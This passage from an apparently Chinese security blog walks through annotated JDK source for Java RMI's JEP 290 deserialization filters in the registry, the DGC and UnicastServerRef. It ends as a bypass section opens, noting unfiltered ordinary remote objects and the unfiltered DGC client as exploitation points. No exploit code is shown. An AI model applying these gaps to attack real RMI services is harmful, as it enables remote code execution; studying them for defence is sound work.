<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置过滤器</span></span><br><span class="line">unmarshalCustomCallData(in);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; types.length; i++) &#123;</span><br><span class="line">    <span class="comment">// 反序列化客户端发送的序列化参数对象</span></span><br><span class="line">    params[i] = unmarshalValue(types[i], in);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>unmarshalCustomCallData</code> 函数会设置过滤器 <code>filter</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 若已设置了过滤器（filter），则为“方法调用实参”的反序列化设置过滤器。</span></span><br><span class="line"><span class="comment"> * 调度（dispatch）在开始读取参数之前调用此方法。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">unmarshalCustomCallData</span><span class="params">(ObjectInput in)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// 仅当已配置过滤器，且输入流确为 ObjectInputStream（或其子类）时才进行设置</span></span><br><span class="line">    <span class="keyword">if</span> (filter != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">            in <span class="keyword">instanceof</span> ObjectInputStream) &#123;</span><br><span class="line">        <span class="comment">// 将通用的 ObjectInput 向下转型为可设置过滤器的 ObjectInputStream</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> (ObjectInputStream) in;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在受限环境（可能启用 SecurityManager）下，以“受保护”的方式设置过滤器，</span></span><br><span class="line">        <span class="comment">// 避免调用方栈帧权限影响到这里的最小必要操作（最小化特权的受控区间）。</span></span><br><span class="line">        AccessController.doPrivileged((PrivilegedAction&lt;Void&gt;) () -&gt; &#123;</span><br><span class="line">            <span class="comment">// 为当前反序列化流挂上 JEP-290 过滤器：</span></span><br><span class="line">            <span class="comment">// 之后 readObject() 对参数进行反序列化时，会先做限额检查与类/包匹配判定。</span></span><br><span class="line">            ois.setObjectInputFilter(filter);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>UnicastServerRef.filter</code> 是 <code>UnicastServerRef</code> 中的一个成员。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// The ObjectInputFilter for checking the invocation arguments</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">transient</span> ObjectInputFilter filter;</span><br></pre></td></tr></table></figure></div>

<p>在导出远程对象的时候 <code>filter</code> 默认为空，也就是默认没有反序列化过滤器。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote obj, <span class="type">int</span> port)</span></span><br><span class="line">    <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> exportObject(obj, <span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(port));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">UnicastServerRef</span><span class="params">(<span class="type">int</span> port)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(port));</span><br><span class="line">    <span class="built_in">this</span>.filter = <span class="literal">null</span>; <span class="comment">// ✅ 默认为空</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="注册中心"><a href="#注册中心" class="headerlink" title="注册中心"></a>注册中心</h4><p>注册中心 <code>RegistryImpl</code> 创建时会定一个过滤器。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">RegistryImpl</span><span class="params">(<span class="type">int</span> port)</span></span><br><span class="line">    <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="type">LiveRef</span> <span class="variable">lref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, port);</span><br><span class="line">    setup(<span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(lref, RegistryImpl::registryFilter));</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">UnicastServerRef</span><span class="params">(LiveRef ref, ObjectInputFilter filter)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(ref);</span><br><span class="line">    <span class="built_in">this</span>.filter = filter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p><code>RegistryImpl::registryFilter</code> 是 <strong>Java 8 的“方法引用（method reference）”语法</strong>，<code>::</code> 是<strong>方法引用运算符</strong>。它不会调用方法，而是把这个方法<strong>当作函数值</strong>传递给需要“函数式接口（SAM）”的地方。</p>
<p>由于 <code>UnicastServerRef</code> 的参数 <code>filter</code> 是 <code>ObjectInputFilter</code> 类型，因此正常应该是下面这种写法：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">setup(<span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(lref, <span class="keyword">new</span> <span class="title class_">ObjectInputFilter</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ObjectInputFilter.Status <span class="title function_">checkInput</span><span class="params">(ObjectInputFilter.FilterInfo info)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> RegistryImpl.registryFilter(info); <span class="comment">// 真正的逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure></div>

<p>因为 <code>ObjectInputFilter</code> 是<strong>函数式接口</strong>（只有一个抽象方法，并且前面还有 <code>@FunctionalInterface</code> 注解）：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">ObjectInputFilter</span> &#123;</span><br><span class="line">    Status <span class="title function_">checkInput</span><span class="params">(FilterInfo info)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>并且 <code>registryFilter</code> 参数、返回值<strong>正好兼容</strong> <code>checkInput(FilterInfo) -&gt; Status</code>：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ObjectInputFilter.Status <span class="title function_">registryFilter</span><span class="params">(ObjectInputFilter.FilterInfo filterInfo)</span> &#123; ... &#125;</span><br></pre></td></tr></table></figure></div>

<p>编译器就把 <code>RegistryImpl::registryFilter</code> 适配成一个实现了 <code>ObjectInputFilter</code> 的对象。</p>
<p>注意这里 <code>::</code> 只是<strong>把方法“引用”成一个函数对象</strong>；<code>.</code> 才是<strong>立刻调用</strong>方法。</p>

    </div>
  </div>

<p><code>RegistryImpl::registryFilter</code> 设置了一个白名单，只允许反序列化特定类的子类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 用于过滤 RMI Registry 端输入对象的 ObjectInputFilter。</span></span><br><span class="line"><span class="comment"> * 允许的类集合被限制为“注册表常见/合法”的那些类型。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> filterInfo 提供当前待反序列化对象的元信息（类、数组长度、深度等）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  &#123;<span class="doctag">@link</span> ObjectInputFilter.Status#ALLOWED&#125; 允许，</span></span><br><span class="line"><span class="comment"> *          &#123;<span class="doctag">@link</span> ObjectInputFilter.Status#REJECTED&#125; 拒绝，</span></span><br><span class="line"><span class="comment"> *          否则 &#123;<span class="doctag">@link</span> ObjectInputFilter.Status#UNDECIDED&#125;（本过滤器不作决定）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ObjectInputFilter.Status <span class="title function_">registryFilter</span><span class="params">(ObjectInputFilter.FilterInfo filterInfo)</span> &#123;</span><br><span class="line">    <span class="comment">// 若用户/外部已配置了自定义的 registryFilter，则先让它“先表态”</span></span><br><span class="line">    <span class="comment">// 只要非 UNDECIDED（即明确允许或拒绝），就直接采用它的结论，覆盖内置白名单策略。</span></span><br><span class="line">    <span class="keyword">if</span> (registryFilter != <span class="literal">null</span>) &#123;</span><br><span class="line">        ObjectInputFilter.<span class="type">Status</span> <span class="variable">status</span> <span class="operator">=</span> registryFilter.checkInput(filterInfo);</span><br><span class="line">        <span class="keyword">if</span> (status != ObjectInputFilter.Status.UNDECIDED) &#123;</span><br><span class="line">            <span class="comment">// 外部过滤器可以覆盖内置白名单</span></span><br><span class="line">            <span class="keyword">return</span> status;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 深度限制：超过注册表允许的最大对象图深度则拒绝</span></span><br><span class="line">    <span class="keyword">if</span> (filterInfo.depth() &gt; REGISTRY_MAX_DEPTH) &#123;</span><br><span class="line">        <span class="keyword">return</span> ObjectInputFilter.Status.REJECTED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 本次待反序列化的类（可能为 null：例如遇到流中的特殊标记而非对象）</span></span><br><span class="line">    Class&lt;?&gt; clazz = filterInfo.serialClass();</span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// —— 数组处理 ——</span></span><br><span class="line">        <span class="keyword">if</span> (clazz.isArray()) &#123;</span><br><span class="line">            <span class="comment">// 若数组长度可得且超过最大允许长度，直接拒绝</span></span><br><span class="line">            <span class="keyword">if</span> (filterInfo.arrayLength() &gt;= <span class="number">0</span> &amp;&amp; filterInfo.arrayLength() &gt; REGISTRY_MAX_ARRAY_SIZE) &#123;</span><br><span class="line">                <span class="keyword">return</span> ObjectInputFilter.Status.REJECTED;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 将（可能是多维的）数组逐层降维，最终拿到元素类型</span></span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="comment">// 是否允许该数组，取决于元素类型（见下方对白名单/原始类型的判断）</span></span><br><span class="line">                clazz = clazz.getComponentType();</span><br><span class="line">            &#125; <span class="keyword">while</span> (clazz.isArray());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 原始类型（primitive）一律允许 —— 等价于“原始类型数组允许”</span></span><br><span class="line">        <span class="keyword">if</span> (clazz.isPrimitive()) &#123;</span><br><span class="line">            <span class="keyword">return</span> ObjectInputFilter.Status.ALLOWED;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// —— 白名单：仅允许下列类型（及其子类/实现） ——</span></span><br><span class="line">        <span class="comment">// 说明：</span></span><br><span class="line">        <span class="comment">//  - String：常见字符串键/值</span></span><br><span class="line">        <span class="comment">//  - Number 派生类：数值类</span></span><br><span class="line">        <span class="comment">//  - Remote：远程对象（或其 Stub/动态代理）</span></span><br><span class="line">        <span class="comment">//  - Proxy：JDK 动态代理类</span></span><br><span class="line">        <span class="comment">//  - UnicastRef：RMI 单播引用</span></span><br><span class="line">        <span class="comment">//  - RMIClientSocketFactory / RMIServerSocketFactory：自定义套接字工厂</span></span><br><span class="line">        <span class="comment">//  - ActivationID / UID：RMI 激活与唯一标识相关类型</span></span><br><span class="line">        <span class="keyword">if</span> (String.class == clazz</span><br><span class="line">                || java.lang.Number.class.isAssignableFrom(clazz)</span><br><span class="line">                || Remote.class.isAssignableFrom(clazz)</span><br><span class="line">                || java.lang.reflect.Proxy.class.isAssignableFrom(clazz)</span><br><span class="line">                || UnicastRef.class.isAssignableFrom(clazz)</span><br><span class="line">                || RMIClientSocketFactory.class.isAssignableFrom(clazz)</span><br><span class="line">                || RMIServerSocketFactory.class.isAssignableFrom(clazz)</span><br><span class="line">                || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz)</span><br><span class="line">                || java.rmi.server.UID.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">return</span> ObjectInputFilter.Status.ALLOWED;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 不在白名单中的引用类型全部拒绝</span></span><br><span class="line">            <span class="keyword">return</span> ObjectInputFilter.Status.REJECTED;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 没有类信息（例如读到的是 NULL/控制片段而非对象）——本过滤器不作决定</span></span><br><span class="line">    <span class="keyword">return</span> ObjectInputFilter.Status.UNDECIDED;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>RegistryImpl</code> 会优先使用事先注册的 <code>registryFilter</code> 过滤器。该过滤器在初始化时读取全局属性 <code>sun.rmi.registry.registryFilter</code>，读不到也是默认 <code>null</code> 过滤器。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 从系统属性 &#123;<span class="doctag">@code</span> &quot;sun.rmi.registry.registryFilter&quot;&#125; 的值创建出来的 registryFilter。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ObjectInputFilter</span> <span class="variable">registryFilter</span> <span class="operator">=</span></span><br><span class="line">        <span class="comment">// 以受限权限块创建（读取安全/系统属性在有安全管理器时可能需要特权）</span></span><br><span class="line">        AccessController.doPrivileged((PrivilegedAction&lt;ObjectInputFilter&gt;) RegistryImpl::initRegistryFilter);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据“系统属性”或“安全属性”初始化 registryFilter（若存在）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 查找顺序：</span></span><br><span class="line"><span class="comment"> *   1) System.getProperty(&quot;sun.rmi.registry.registryFilter&quot;)</span></span><br><span class="line"><span class="comment"> *   2) Security.getProperty(&quot;sun.rmi.registry.registryFilter&quot;)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 若配置了规则字符串则返回解析后的 ObjectInputFilter，否则返回 null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;deprecation&quot;)</span> <span class="comment">// 使用了部分内部/旧日志类等，屏蔽编译器弃用警告</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ObjectInputFilter <span class="title function_">initRegistryFilter</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">ObjectInputFilter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 先读系统属性（可用 -Dsun.rmi.registry.registryFilter=... 设置）</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">props</span> <span class="operator">=</span> System.getProperty(REGISTRY_FILTER_PROPNAME);</span><br><span class="line">    <span class="keyword">if</span> (props == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 若系统属性未配置，再读安全属性（java.security 配置文件中的同名键）</span></span><br><span class="line">        props = Security.getProperty(REGISTRY_FILTER_PROPNAME);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (props != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 将规则字符串解析为 JEP-290 过滤器（pattern DSL：maxdepth=...; 包/类通配; !否定 等）</span></span><br><span class="line">        filter = ObjectInputFilter.Config.createFilter(props);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 按 RMI 内部日志配置输出一条简要日志，便于诊断</span></span><br><span class="line">        <span class="type">Log</span> <span class="variable">regLog</span> <span class="operator">=</span> Log.getLog(<span class="string">&quot;sun.rmi.registry&quot;</span>, <span class="string">&quot;registry&quot;</span>, -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (regLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">            regLog.log(Log.BRIEF, <span class="string">&quot;registryFilter = &quot;</span> + filter);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 未配置属性则返回 null（调用方据此决定是否使用内置白名单）</span></span><br><span class="line">    <span class="keyword">return</span> filter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="DGC-1"><a href="#DGC-1" class="headerlink" title="DGC"></a>DGC</h4><p>同样 <code>DGCImpl</code> 在静态代码块中也设置了自己的过滤器 <code>DGCImpl::checkInput</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dgc = <span class="keyword">new</span> <span class="title class_">DGCImpl</span>();</span><br><span class="line"><span class="type">ObjID</span> <span class="variable">dgcID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(ObjID.DGC_ID);</span><br><span class="line"><span class="type">LiveRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(dgcID, <span class="number">0</span>);</span><br><span class="line"><span class="type">UnicastServerRef</span> <span class="variable">disp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(ref,</span><br><span class="line">        DGCImpl::checkInput);</span><br><span class="line"><span class="type">Remote</span> <span class="variable">stub</span> <span class="operator">=</span></span><br><span class="line">    Util.createProxy(DGCImpl.class,</span><br><span class="line">                     <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(ref), <span class="literal">true</span>);</span><br><span class="line">disp.setSkeleton(dgc);</span><br></pre></td></tr></table></figure></div>

<p><code>DGCImpl::checkInput</code> 实现如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 面向 DGC（分布式垃圾回收）的 ObjectInputFilter，用于过滤入站反序列化对象。</span></span><br><span class="line"><span class="comment"> * 可接受的类清单非常短且明确，并对对象图深度与数组大小做了限制。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> filterInfo 访问当前检查点的信息（类、数组长度、深度、引用计数、已读字节等）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  若允许则返回 &#123;<span class="doctag">@link</span> ObjectInputFilter.Status#ALLOWED&#125;，</span></span><br><span class="line"><span class="comment"> *          若拒绝则返回 &#123;<span class="doctag">@link</span> ObjectInputFilter.Status#REJECTED&#125;，</span></span><br><span class="line"><span class="comment"> *          否则返回 &#123;<span class="doctag">@link</span> ObjectInputFilter.Status#UNDECIDED&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ObjectInputFilter.Status <span class="title function_">checkInput</span><span class="params">(ObjectInputFilter.FilterInfo filterInfo)</span> &#123;</span><br><span class="line">    <span class="comment">// 若存在外部/用户提供的 dgcFilter，则先让其裁决；</span></span><br><span class="line">    <span class="comment">// 只要返回值不是 UNDECIDED，就以该结果为准（可以覆盖内置白名单）。</span></span><br><span class="line">    <span class="keyword">if</span> (dgcFilter != <span class="literal">null</span>) &#123;</span><br><span class="line">        ObjectInputFilter.<span class="type">Status</span> <span class="variable">status</span> <span class="operator">=</span> dgcFilter.checkInput(filterInfo);</span><br><span class="line">        <span class="keyword">if</span> (status != ObjectInputFilter.Status.UNDECIDED) &#123;</span><br><span class="line">            <span class="comment">// DGC 级别的过滤器可以覆盖内置的白名单规则</span></span><br><span class="line">            <span class="keyword">return</span> status;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1) 限制对象图深度：超过最大深度直接拒绝</span></span><br><span class="line">    <span class="keyword">if</span> (filterInfo.depth() &gt; DGC_MAX_DEPTH) &#123;</span><br><span class="line">        <span class="keyword">return</span> ObjectInputFilter.Status.REJECTED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 获取当前正在反序列化的类；可能为 null（例如仅检查对已读对象的引用时）</span></span><br><span class="line">    Class&lt;?&gt; clazz = filterInfo.serialClass();</span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 2.1 数组处理：限制数组长度，并将 clazz 递归降为元素类型</span></span><br><span class="line">        <span class="keyword">while</span> (clazz.isArray()) &#123;</span><br><span class="line">            <span class="comment">// 若存在数组长度信息且超过阈值则拒绝</span></span><br><span class="line">            <span class="keyword">if</span> (filterInfo.arrayLength() &gt;= <span class="number">0</span> &amp;&amp; filterInfo.arrayLength() &gt; DGC_MAX_ARRAY_SIZE) &#123;</span><br><span class="line">                <span class="keyword">return</span> ObjectInputFilter.Status.REJECTED;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 是否允许数组取决于组件类型，继续拿到元素类型</span></span><br><span class="line">            clazz = clazz.getComponentType();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.2 原始类型（int、long、…）的数组被允许</span></span><br><span class="line">        <span class="keyword">if</span> (clazz.isPrimitive()) &#123;</span><br><span class="line">            <span class="keyword">return</span> ObjectInputFilter.Status.ALLOWED;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.3 白名单：仅允许与 RMI DGC 相关的少量类型；其他一律拒绝</span></span><br><span class="line">        <span class="keyword">return</span> (clazz == ObjID.class ||</span><br><span class="line">                clazz == UID.class ||</span><br><span class="line">                clazz == VMID.class ||</span><br><span class="line">                clazz == Lease.class)</span><br><span class="line">                ? ObjectInputFilter.Status.ALLOWED</span><br><span class="line">                : ObjectInputFilter.Status.REJECTED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 非“类实例”场景（如仅为已反序列化对象的引用），此处不做大小限制，交由上层决定</span></span><br><span class="line">    <span class="keyword">return</span> ObjectInputFilter.Status.UNDECIDED;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>注意这里是 DGC 服务端的过滤，而 DGC 客户端在低版本没有过滤。这也是后面针对注册中心常用的利用点。</p>
<h3 id="JEP-290-绕过"><a href="#JEP-290-绕过" class="headerlink" title="JEP 290 绕过"></a>JEP 290 绕过</h3><h4 id="普通远程对象"><a href="#普通远程对象" class="headerlink" title="普通远程对象"></a>普通远程对象</h4><p>对于普通远程对象，<code>UnicastServerRef</code> 中的 <code>ObjectInputFilter</code> 默认是 <code>null</code>。因此，攻击者依然可以传输恶意对象触发反序列化漏洞。</p>
<p>这并不能算严格意义的“bypass”，更像是 <strong>防护机制未覆盖完全</strong>。</p>
